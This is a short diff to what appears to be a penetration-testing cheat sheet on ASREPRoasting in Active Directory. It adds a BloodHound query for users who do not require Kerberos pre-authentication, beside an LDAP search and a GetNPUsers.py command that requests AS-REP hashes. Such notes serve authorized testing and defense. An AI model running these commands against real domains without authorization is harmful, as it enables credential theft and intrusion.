@@ -32,6 +32,8 @@ From Windows against single user using Rubeus.exe:
 ## ASREPRoast 
 Query accounts for "do not require Kerberos pre-authentication":   
 `([adsisearcher]"(&(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))").FindAll()`   
+Find such users in BloodHound:   
+`MATCH (u:User {dontreqpreauth:true}) RETURN u`   
 
 If accounts do not require kerberos pre-authentication, the tool GetNPUsers.py can be used to do ASREPRoasting:   
 `GetNPUsers.py -request domain.local/someaccount:`   
